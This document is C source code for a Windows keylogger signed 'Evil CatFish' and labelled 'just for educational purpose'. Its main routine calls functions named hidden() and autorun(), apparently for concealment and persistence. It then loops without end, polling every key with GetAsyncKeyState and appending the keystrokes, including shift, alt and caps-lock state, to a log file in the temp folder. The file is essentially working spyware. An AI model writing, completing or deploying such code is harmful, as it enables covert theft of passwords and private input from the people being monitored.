#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <time.h>
#include "case_key.h"
#include <string.h>

#define line 100
#define MAX 4000
#define sl 1
#define name "\\win_log.txt"
#define b_lenght 256

void test(FILE *f,int *p_ret,int *caps_lock, int *p_limit);

int main(){

	hidden();
	autorun();

	time_t rawtime;
  struct tm * timeinfo;
  time ( &rawtime );
  timeinfo = localtime ( &rawtime );

	int limit = 0;
	int *p_limit = NULL;
	p_limit = &limit;

	int caps = 0;
	int *caps_lock = NULL;
	caps_lock = &caps;

	int ret = 0;
	int *p_ret = NULL;
	p_ret = &ret;

	char temp_path[100];
	char *buffer = NULL;
	buffer = malloc(b_lenght);

	if (GetTempPath(b_lenght,buffer) != 0){strcpy(temp_path,buffer);}
	else {printf("Impossible d\'avoir le chemin du temp ");}
	strcat(temp_path,name);

	FILE *file = fopen(temp_path,"a");

	if (file != NULL)

	{

		fputs("\n\n#--------------------------------------------------LOG-----------------------------------------------#\n",file);
		fputs("\t\t\t\t\t",file);
		fputs(asctime (timeinfo),file);
		fputs("\n",file);
		fputs("\t\t\t\tThis Keylogger was made by Evil CatFish\t\t\t\t\t\n",file);
		fputs("\t\t\t\t  Just for educational purpose :)\t\t\t\t\n\n",file);
		fputs("#-----------------------------------------------RESULTS-----------------------------------------------#\n\n",file);

		while (1)

			{

				test(file,p_ret,caps_lock,p_limit);
				Sleep(sl);
				fclose(file);
				FILE *file = fopen(temp_path,"a");

			}

		fclose(file);

	}

	else {printf("%s non reconnu ",temp_path);}

	return 0;

}

void test(FILE* f,int *p_ret,int *caps_lock, int *p_limit)
{
	int maj = 0;
	int alt = 0;



	if (GetAsyncKeyState(0x14) != -32768  && GetAsyncKeyState(0x14) != -32767 && GetAsyncKeyState(0x14) !=0)
	{
		if (*caps_lock){*caps_lock = 0;}
		else{	*caps_lock = 1;}
	}

	if (GetAsyncKeyState(0xA4) || GetAsyncKeyState(0xA5) || GetAsyncKeyState(0x12))
	{
		alt = 1;
	}

	if (GetAsyncKeyState(0x10) || GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
	{
		maj = 1;
	}

	for (int i = 0; i < 255; i++)
	{

	if (GetAsyncKeyState(i)!= -32768 && GetAsyncKeyState(i)!= -32767 && GetAsyncKeyState(i)!=0)
	{
			if (*p_limit>line)
			{
				*p_limit = 0;
				fputs("\n",f);
			}
			wkey(i,f,maj,alt,caps_lock,p_limit);
	}

	}

}
